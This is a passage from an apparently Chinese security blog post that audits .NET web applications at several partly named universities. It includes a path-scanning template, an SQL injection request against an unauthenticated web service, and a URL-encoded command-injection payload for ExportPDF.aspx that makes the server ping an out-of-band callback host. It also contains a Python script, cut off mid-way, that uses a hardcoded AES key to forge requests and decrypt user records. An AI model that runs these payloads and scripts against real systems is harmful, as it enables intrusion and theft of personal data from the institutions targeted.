class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/verify.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/webservice.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ws/ErrorTrap.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ws/FacetService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ws/Schedules.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/wsutils.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/yocityws/SoapHeaderService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/UserCenter.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/webservice&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/bin.zip&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/bin.rar&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/web.zip&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/web.rar&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">matchers:</span>  </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dsl</span>  </span><br><span class="line">        <span class="attr">dsl:</span>  </span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;status_code == 200&#x27;</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;status_code == 403&#x27;</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">or</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x03-开始审计"><a href="#0x03-开始审计" class="headerlink" title="0x03 开始审计"></a>0x03 开始审计</h1><h2 id="XXX医药大学"><a href="#XXX医药大学" class="headerlink" title="XXX医药大学"></a>XXX医药大学</h2><p><img src="/images/Pasted%20image%2020240808112935.png"></p>
+<h3 id="找入口DLL文件"><a href="#找入口DLL文件" class="headerlink" title="找入口DLL文件"></a>找入口DLL文件</h3><p>解压RAR，获取DLL文件：<br><img src="/images/Pasted%20image%2020240808113120.png"></p>
+<ul>
+<li>针对此网站找路由的方式：</li>
+</ul>
+<p>当访问一个不存在的地址时程序会跳转统一报错页面，并输出错误信息，但是这里没有输出具体调用的代码，只有调用System.Web.Mvc的相关信息，这不是我们想要的。<br><img src="/images/Pasted%20image%2020240808113420.png"></p>
+<p>接着爆破（大力出奇迹）：<br><img src="/images/Pasted%20image%2020240806043002.png"></p>
+<p>当指定目标主路由时，默认子路由不存在则会报错，此时得到入口地址：<br><img src="/images/Pasted%20image%2020240808113632.png"></p>
+<h3 id="反编译入口"><a href="#反编译入口" class="headerlink" title="反编译入口"></a>反编译入口</h3><p>使用Dnspy反编译，C#属性印入眼帘<br><img src="/images/Pasted%20image%2020240809095550.png"></p>
+<p>属性解释：</p>
+<ul>
+<li><code>[assembly: AssemblyVersion(&quot;6.2.1.0&quot;)]</code>: 定义程序集的版本号，通常用于版本管理和兼容性。</li>
+<li><code>[assembly: CompilationRelaxations(8)]</code>: 指定编译器的放宽规则，通常用于优化编译过程。</li>
+<li><code>[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]</code>: 允许处理非异常抛出的代码，提供更好的运行时兼容性。</li>
+<li><code>[assembly: Debuggable(...)]</code>: 指示调试器在调试时如何处理代码，如关闭优化、忽略符号存储点等，以便更容易进行调试。</li>
+<li><code>[assembly: PreApplicationStartMethod(typeof(SwaggerConfig), &quot;Register&quot;)]</code>: 指定在应用框架启动之前要执行的静态方法，通常用于配置设置，如Swagger配置。</li>
+<li><code>[assembly: AssemblyTitle(&quot;BPMClient&quot;)]</code>: 指定程序集的标题。</li>
+<li><code>[assembly: AssemblyDescription(&quot;MVC5+WEBAPI&quot;)]</code>: 提供程序集的描述信息，通常用于文档和显示目的。</li>
+<li><code>[assembly: AssemblyConfiguration(&quot;&quot;)]</code>: 可填写此程序集的配置，如“Debug”、“Release”等，通常留空。</li>
+<li><code>[assembly: AssemblyCompany(&quot;&quot;)]</code>: 指定公司名称，通常用于发布信息。</li>
+<li><code>[assembly: AssemblyProduct(&quot;BPMClient&quot;)]</code>: 指定程序集的产品名称。</li>
+<li><code>[assembly: AssemblyCopyright(&quot;版权所有(C) 2018&quot;)]</code>: 版权声明，通常包含版权所有的年份。</li>
+<li><code>[assembly: AssemblyTrademark(&quot;&quot;)]</code>: 商标信息，通常留空或者填写商标名称。</li>
+<li><code>[assembly: ComVisible(false)]</code>: 指示程序集是否可用于 COM 组件，<code>false</code>表示不可见。</li>
+<li><code>[assembly: Guid(&quot;01a316fe-79ac-4fd2-87cf-221c3f1e4ca2&quot;)]</code>: 为程序集指定一个唯一的标识符（GUID），通常用于 COM。</li>
+<li><code>[assembly: AssemblyFileVersion(&quot;6.2.1.0&quot;)]</code>: 指定文件的版本信息，通常用于文件系统。</li>
+<li><code>[assembly: TargetFramework(&quot;.NETFramework,Version=v4.5&quot;, FrameworkDisplayName = &quot;.NET Framework 4.5&quot;)]</code>: 表示目标框架，指定该程序集是基于 .NET Framework 4.5。</li>
+<li><code>[assembly: SecurityPermission(SecurityAction.RequestMinimum, SkipVerification = true)]</code>: 请求最低的安全权限，允许代码在某些条件下跳过验证过程，通常在多信任环境中使用。</li>
+</ul>
+<p>接下来优先看controller就好<br><img src="/images/Pasted%20image%2020240809100157.png"></p>
+<h3 id="Webservice接口导致Sql注入"><a href="#Webservice接口导致Sql注入" class="headerlink" title="Webservice接口导致Sql注入"></a>Webservice接口导致Sql注入</h3><p>controller大致看了十几分钟没了兴致，发现大部分控制器都鉴权了，而我只想要快速出洞。</p>
+<ul>
+<li>这里多说两句鉴权</li>
+</ul>
+<p>此处直接在类和index方法上都加了<code>[Authorize]</code>注解<br><img src="/images/Pasted%20image%2020240809100701.png"></p>
+<p>追进去看一下，定义了一些鉴权操作<br><img src="/images/Pasted%20image%2020240809100940.png"></p>
+<p>众所周知.net环境下webservice内容定义的接口文档通常是无需权限验证的，<code>DMMWS</code>这个类吸引了我的注意。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">WebService(Namespace = <span class="string">&quot;http://tempuri.org/&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)</span>]</span><br><span class="line">[<span class="meta">ToolboxItem(false)</span>]</span><br><span class="line">[<span class="meta">ScriptService</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DMMWS</span> : <span class="title">WebService</span></span><br><span class="line"><span class="comment">// DMMWS继承自WebService</span></span><br></pre></td></tr></table></figure>
+
+<p>这个函数传参数很简单，跟进去看看<br><img src="/images/Pasted%20image%2020240815141402.png"></p>
+<p>拼接字符串，其实看到这就能想到后面大概率是sql注入了<br><img src="/images/Pasted%20image%2020240815141529.png"></p>
+<p>跟进，开始拼接查数据库数据了，<strong>sql注入+1</strong><br><img src="/images/Pasted%20image%2020240815141700.png"></p>
+<h3 id="利用namespace反向找asmx"><a href="#利用namespace反向找asmx" class="headerlink" title="利用namespace反向找asmx"></a>利用namespace反向找asmx</h3><p>现在找到了sql注入漏洞，问题来了，怎么访问呢？</p>
+<ul>
+<li>来看个案例</li>
+</ul>
+<p>namespace为<code>HMFW.Web.API</code>，class类为：<code>DibaoImport</code>，设置了WebService类型<br>可以判断出文件具体位置为：<code>/api/DibaoImport.asmx</code></p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">HMFW.Web.API</span></span><br><span class="line">&#123;</span><br><span class="line">	[<span class="meta">WebService(Namespace = <span class="string">&quot;http://tempuri.org/&quot;</span>)</span>]</span><br><span class="line">	[<span class="meta">WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)</span>]</span><br><span class="line">	[<span class="meta">ToolboxItem(false)</span>]</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DibaoImport</span> : <span class="title">WebService</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> GFCID</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">this</span>._GFCID;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">this</span>._GFCID = <span class="keyword">value</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240223173208.png"></p>
+<p>这里也是一样，namespace：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">BPMClient.WebServices</span></span><br></pre></td></tr></table></figure>
+
+<p>class：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DMMWS</span> : <span class="title">WebService</span></span><br></pre></td></tr></table></figure>
+
+<p>接口路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/WebServices/DMMWS.asmx</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240815142453.png"></p>
+<p>接下来不管是使用wsdl的方式使用xml传参还是用post传也都一样了，这里使用原生功能传参。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /WebServices/DMMWS.asmx/GetProcessModelListByPN HTTP/1.1</span><br><span class="line">Host: xxxxx</span><br><span class="line">Cookie: ASP.NET_SessionId=111</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">processName=1</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap一下：<br><img src="/images/Pasted%20image%2020240815142805.png"></p>
+<h3 id="导出PDF导致RCE"><a href="#导出PDF导致RCE" class="headerlink" title="导出PDF导致RCE"></a>导出PDF导致RCE</h3><p>其实系统里面还有一些其他sql注入，这里就不赘述了，有了一个漏洞准备收工了，最后胡乱点击看看其他代码，发现了一个类：<code>ExportPDF</code>，发现他的方法是Page_Load，没想到这还不是纯mvc的架构，还有一些单独的aspx文件。</p>
+<p>解释：通常情况下.net环境，aspx文件会编译为dll文件，在后续的访问中进行对应调用，访问aspx时默认会调用其对应的Page_Load方法。<br><img src="/images/Pasted%20image%2020240815143716.png"></p>
+<p>传输了4个参数：TaskID、Number、Type、PROCESSNAME<br>接着实例化pdfExport调用HtmlToPdf方法传入了参数。</p>
+<p>简单阅读HtmlToPdf，总而言之就是将传入的值拼接，然后调用cmd执行wkhtmltopdf.exe将网页导出为pdf。<br><img src="/images/Pasted%20image%2020240815144648.png"></p>
+<p>实例化Process，然后执行命令：<br><img src="/images/Pasted%20image%2020240815144811.png"></p>
+<ul>
+<li>简单解释下</li>
+</ul>
+<p><strong><code>process.StartInfo.RedirectStandardOutput = true;</code></strong><br>将标准输出流重定向到调用程序，以便程序可以读取外部进程的输出。这是在需要捕获外部程序生成的文本或日志时常用的设置</p>
+<p><strong><code>process.StartInfo.CreateNoWindow = true;</code></strong><br>设置为 <code>true</code>，表示在启动外部程序时不创建新的窗口。这通常用于后台进程操作，以保持用户界面的整洁</p>
+<p><strong><code>process.Start();</code></strong><br>这行代码启动之前配置好的进程。在调用 <code>Start()</code> 方法后，外部程序将开始执行</p>
+<p><strong><code>process.WaitForExit(60000);</code></strong><br>这行代码使调用线程等待外部进程结束，最多等待60000毫秒（即60秒）。如果外部进程在这个时间内完成，调用线程将继续执行。如果超过60秒，调用将会超时，线程将继续执行后面的代码。这是一种防止应用程序挂起的安全措施。</p>
+<p><strong><code>string str3 = process.StandardOutput.ReadToEnd();</code></strong><br>这行代码从外部进程的标准输出流中读取所有输出，直到流的末尾，并将其存储在变量 <code>str3</code> 中。</p>
+<p>简而言之，观察代码可以命令注入，构造个拼接语句即可。<br>发现Number拼接最不影响其他位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; &amp; ping v40644kpvyvkpm5wwgmkesad84ev2lqa.oastify.com &amp; &quot;</span><br></pre></td></tr></table></figure>
+<p>传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/steppages/ExportPDF.aspx?TaskID=1&amp;Number=1&quot; &amp; ping v40644kpvyvkpm5wwgmkesad84ev2lqa.oastify.com &amp; &quot;a&amp;Type=tp&amp;PROCESSNAME=test</span><br></pre></td></tr></table></figure>
+<p>编码一下，让更稳定：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/steppages/ExportPDF.aspx?TaskID=1&amp;Number=%31%22%20%26%20%70%69%6e%67%20%76%34%30%36%34%34%6b%70%76%79%76%6b%70%6d%35%77%77%67%6d%6b%65%73%61%64%38%34%65%76%32%6c%71%61%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%20%26%20%22%61&amp;Type=tp&amp;PROCESSNAME=test</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240815145623.png"></p>
+<p><strong>RCE+1</strong>，可以下一个了。</p>
+<h2 id="西-学院"><a href="#西-学院" class="headerlink" title="西***学院"></a>西***学院</h2><p>扫到源码，开始审计。<br><img src="/images/Pasted%20image%2020240901191912.png"></p>
+<h3 id="找入口DLL"><a href="#找入口DLL" class="headerlink" title="找入口DLL"></a>找入口DLL</h3><p>其实不管怎么样最终肯定是能找到的，我这里只说如何快速找到。</p>
+<p>访问网站跳转统一身份认证。<br><img src="/images/Pasted%20image%2020240901191852.png"></p>
+<p>发现一些接口地址，报了错误，net程序开启了debug模式，报错内容还挺多。我这里访问的路由是<code>/ad</code><br><img src="/images/Pasted%20image%2020240901192536.png"></p>
+<p>从报错内容来看，通过<code>/ad</code>同时找到了多个匹配控制器，至少确定了入口，直接找对应dll即可。<br><img src="/images/Pasted%20image%2020240901193838.png"></p>
+<h3 id="未授权访问导致Sql注入"><a href="#未授权访问导致Sql注入" class="headerlink" title="未授权访问导致Sql注入"></a>未授权访问导致Sql注入</h3><p>反编译dll，发现不少controller，大致都看看<br><img src="/images/Pasted%20image%2020240901194105.png"></p>
+<p>大致阅读下代码发现，大部分内容进行了鉴权<br><img src="/images/Pasted%20image%2020240901194452.png"></p>
+<p>看下UserLogin的注解代码，总而言之：使用<code>JsonConvert</code>反序列化内容，对cookie等信息进行验证，鉴权的这部分代码还是比较繁多的（同时还可以全局搜索<code>JsonConvert</code>，尝试寻找反序列化漏洞触发点，此处暂不介绍）。<br><img src="/images/Pasted%20image%2020240901194828.png"><br><img src="/images/Pasted%20image%2020240901194840.png"></p>
+<p>虽然大部分代码进行了鉴权，但还是有一些方法没有进行鉴权，下面将优先着重去看没有鉴权的方法。</p>
+<p><code>CheckTeacherForGlobal</code>可以搜索学校、老师等信息<br><img src="/images/Pasted%20image%2020240901195254.png"></p>
+<p>一眼丁真，传入参数<code>userId</code>和<code>schoolId</code>给<code>GetTeacherByUserId</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TeacherEntity teacherByUserId = Helper&lt;TeacherBLL&gt;.Instance.GetTeacherByUserId(userId, schoolId);</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240901195419.png"></p>
+<p>追进去看看<br><img src="/images/Pasted%20image%2020240901195625.png"></p>
+<p>继续，调用Dal层代码，使用format直接拼接，稳Sql注入了，可以收工了。<br><img src="/images/Pasted%20image%2020240901195640.png"></p>
+<p>是个mysql，寄没意思。<br><img src="/images/Pasted%20image%2020240901195818.png"></p>
+<ul>
+<li>Tips：当然了，这种正向的审计方式也可以调换下，先优先看Dal层代码，如果存在注入，然后再反向去找调用点，这样效率可能会高一些。</li>
+</ul>
+<p><img src="/images/Pasted%20image%2020240901200306.png"></p>
+<h2 id="师范学院"><a href="#师范学院" class="headerlink" title="**师范学院"></a>**师范学院</h2><h3 id="DLL-入口"><a href="#DLL-入口" class="headerlink" title="DLL 入口"></a>DLL 入口</h3><p>一眼顶真：API.dll<br><img src="/images/Pasted%20image%2020240927085257.png"></p>
+<p>导入存在Controller，接下来审计即可：<br><img src="/images/Pasted%20image%2020240927085355.png"></p>
+<h3 id="流量解密导致信息泄漏"><a href="#流量解密导致信息泄漏" class="headerlink" title="流量解密导致信息泄漏"></a>流量解密导致信息泄漏</h3><p>审计发现UserController的UserInfo没有设置鉴权。</p>
+<p>UserInfo函数传入para参数<br><img src="/images/Pasted%20image%2020240927090706.png"></p>
+<p>Header获取From参数，如果值是WeChat则对para进行解密<br><img src="/images/Pasted%20image%2020240927103450.png"></p>
+<p>跟进Decrypt，发现HHSoftEncrypt类还定义了加密方法：Encrypt<br>解密：<br><img src="/images/Pasted%20image%2020240927103603.png"></p>
+<p>加密：<img src="/images/Pasted%20image%2020240927103619.png"></p>
+<p>para值应当是json，解密完事后使用json进行解析，读取user_id参数。<br>那么我们只需要构造json进行加密，然后传入即可：<br><img src="/images/Pasted%20image%2020240927104030.png"></p>
+<p>分析下HHSoftEncrypt类的Encrypt函数，有种spring的分层写法风格，但实际上下面定义了AES_key， 那么我们可以直接用aes加密试一下：<br><img src="/images/Pasted%20image%2020240927104502.png"></p>
+<p>需要注意的是代码中对user_id参数值也进行了解密，所有user_id也需要加密处理：<br><img src="/images/Pasted%20image%2020240927104600.png"><br>加密一下，最终需要使用base64加密<br><img src="/images/Pasted%20image%2020240804025328.png"></p>
+<p>发包过去，返回内容明显比之前测试时更长，表示返回了内容。<br><img src="/images/Pasted%20image%2020240927104755.png"></p>
+<p>接着用同样的方式对返回内容解密即可：<br><img src="/images/Pasted%20image%2020240804025442.png"></p>
+<p>但实际上程序对每个value都加密了，可以写个脚本少量便利下获取明文：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encrypt</span>(<span class="params">plain_text</span>):</span><br><span class="line">    <span class="keyword">if</span> plain_text:</span><br><span class="line">        bytes_to_encrypt = plain_text.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">        key_string = <span class="string">&quot;1862b0deb369e73a&quot;</span>  </span><br><span class="line">        key = <span class="built_in">bytearray</span>(<span class="number">16</span>)  </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):  </span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(key_string):  </span><br><span class="line">                key[i] = <span class="built_in">ord</span>(key_string[i]) </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                key[i] = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">        iv = <span class="built_in">bytearray</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>)) </span><br><span class="line"></span><br><span class="line">        cipher = AES.new(<span class="built_in">bytes</span>(key), AES.MODE_CBC, <span class="built_in">bytes</span>(iv))  </span><br><span class="line">        padded_data = pad(bytes_to_encrypt, AES.block_size)  </span><br><span class="line">        encrypted = cipher.encrypt(padded_data)  </span><br><span class="line"></span><br><span class="line">        result = base64.b64encode(encrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        result = plain_text  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">value</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;解码 Base64 字符串，处理可能的异常情况&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="comment"># Base64 解码  </span></span><br><span class="line">        decoded_bytes = base64.b64decode(value)  </span><br><span class="line">        <span class="comment"># 将字节转换为字符串  </span></span><br><span class="line">        <span class="keyword">return</span> decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="comment"># 在解码失败时返回原始值或处理异常  </span></span><br><span class="line">        <span class="keyword">return</span> value  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_base64</span>(<span class="params">input_string</span>):  </span><br><span class="line">    <span class="comment"># 将字符串转换为字节  </span></span><br><span class="line">    input_bytes = input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行 Base64 编码  </span></span><br><span class="line">    base64_bytes = base64.b64encode(input_bytes)  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将编码后的字节转换回字符串  </span></span><br><span class="line">    base64_string = base64_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64_string  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decrypt</span>(<span class="params">cipher_text</span>):  </span><br><span class="line">    <span class="keyword">if</span> cipher_text:  </span><br><span class="line">        <span class="comment"># URL 解码替换  </span></span><br><span class="line">        cipher_text = cipher_text.replace(<span class="string">&quot;%2b&quot;</span>, <span class="string">&quot;+&quot;</span>)  </span><br><span class="line">        <span class="comment"># 将 Base64 字符串转换为字节  </span></span><br><span class="line">        byte_array = base64.b64decode(cipher_text)  </span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置密钥  </span></span><br><span class="line">        key_string = <span class="string">&quot;1862b0deb369e73a&quot;</span>  </span><br><span class="line">        key = <span class="built_in">bytearray</span>(<span class="number">16</span>)  </span><br><span class="line">        bytes_key = <span class="built_in">bytearray</span>(key_string.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):  </span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(bytes_key):  </span><br><span class="line">                key[i] = <span class="number">18</span>  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                key[i] = bytes_key[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置 IV  </span></span><br><span class="line">        iv = <span class="built_in">bytearray</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>))  <span class="comment"># [1, 2, ..., 16]  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建 AES 解密器  </span></span><br><span class="line">        cipher = AES.new(<span class="built_in">bytes</span>(key), AES.MODE_CBC, <span class="built_in">bytes</span>(iv))  </span><br><span class="line">        decrypted = cipher.decrypt(byte_array)  </span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将解密后的数据转换为字符串  </span></span><br><span class="line">        result = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)  <span class="comment"># 去除多余的空字符  </span></span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        result = cipher_text  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_invisible_characters</span>(<span class="params">input_string</span>):  </span><br><span class="line">    <span class="comment"># 使用 rstrip() 去除末尾的不可见字符  </span></span><br><span class="line">    <span class="keyword">return</span> input_string.rstrip(<span class="string">&#x27;\x00\x01\x02\x03\x04\x05\x06\x07\x08&#x27;</span>  <span class="comment"># Control characters  </span></span><br><span class="line">                                <span class="string">&#x27;\x0B\x0C\x0E\x0F\x10\x11\x12\x13&#x27;</span>  <span class="comment"># More control characters  </span></span><br><span class="line">                                <span class="string">&#x27;\x14\x15\x16\x17\x18\x19\x1A\x1B&#x27;</span>   </span><br><span class="line">                                <span class="string">&#x27;\x1C\x1D\x1E\x1F&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    url = <span class="string">&quot;https://xxxxxx/User/UserInfo&quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span 